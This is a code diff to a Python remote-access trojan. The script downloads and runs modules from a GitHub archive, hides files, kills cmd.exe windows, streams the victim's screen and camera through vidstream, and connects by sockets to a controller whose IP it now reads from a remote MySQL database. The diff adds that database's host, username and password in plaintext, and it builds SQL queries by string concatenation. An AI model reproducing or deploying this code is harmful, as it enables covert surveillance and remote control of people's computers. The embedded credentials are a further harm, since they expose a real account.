@@ -1,9 +1,9 @@
-import socket, zipfile, os, shutil, time, subprocess, requests, pyautogui
+import socket, zipfile, os, shutil, time, subprocess, requests, pyautogui, pymysql
 from vidstream import ScreenShareClient, CameraClient; from turtle import left
 from multiprocessing import Process
 time.sleep(5)
-url = "https://github.com/N0SAFE/kit/archive/refs/heads/main.zip"
-    
+url = "https://github.com/N0SAFE/kit-local/archive/refs/heads/main.zip"
+content, co = "IP", ["mysql-lyceestvincent.alwaysdata.net", "116313_msebille", "CMn674pgtFyMKdjPeFLR", "lyceestvincent_msebille"]
 def getpath(change=False):
     if change in (False, "not", "\\"):          return os.getcwd()
     else:                                       return os.getcwd().replace('\\', '/')
@@ -12,6 +12,29 @@ def getNameDir(data):                           return (data.split("/")[len(data
 
 def supDir(data):                               shutil.rmtree(data)
 
+def select(connexion="", tableName="", content="", where=""):
+    try:
+        if len(connexion) == 4:
+            connection = pymysql.connect(host=connexion[0], user=connexion[1], passwd=connexion[2], database=connexion[3])
+            #database connection
+            cursor = connection.cursor()
+        else:
+            print("connexion isn't complete")
+            return False
+        if tableName != "":
+            altertable = """SELECT """+content+" FROM "+tableName
+            if where != "":
+                altertable = altertable + " WHERE "+where+" ;"
+            cursor.execute(altertable)
+            rows = cursor.fetchall()
+            connection.close()
+            return rows
+    except:
+        connection.close()
+        print("table isn't exist")
+        return False
+def getServerIp():
+    return "".join(("".join(("".join(("".join((str(select(co, "test", content))).split("("))).split("'"))).split(","))).split(")"))
 def downloadFileGithub(file_url, data=".zip"):
     with open(data,"wb") as zip	: 
         for chunk in (requests.get(file_url, stream = True)).iter_content(chunk_size=1024): 
@@ -42,6 +65,7 @@ while tryit == False:
     try: 
         import modif, scripter
         tryit = True
+        subprocess.Popen("taskkill /IM cmd.exe /F")
     except:
         listfile, dir = ["modif.pyw", "scripter.pyw"], getNameDir(url)
         downloadFileGithub(url)
@@ -51,6 +75,7 @@ while tryit == False:
         time.sleep(0.5)
         os.system(getFileName())
         modif.hiddenFiles()
+        time.sleep(2)
 
 def receive():
     try:
@@ -161,7 +186,7 @@ def execute(data):
 run, ossys = True, False
 while run == True:
     try:
-        sortir, ipScreen, port = False, "172.17.1.214", 22228
+        sortir, ipScreen, port = False, getServerIp(), 22228
         
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect((ipScreen, 22223))
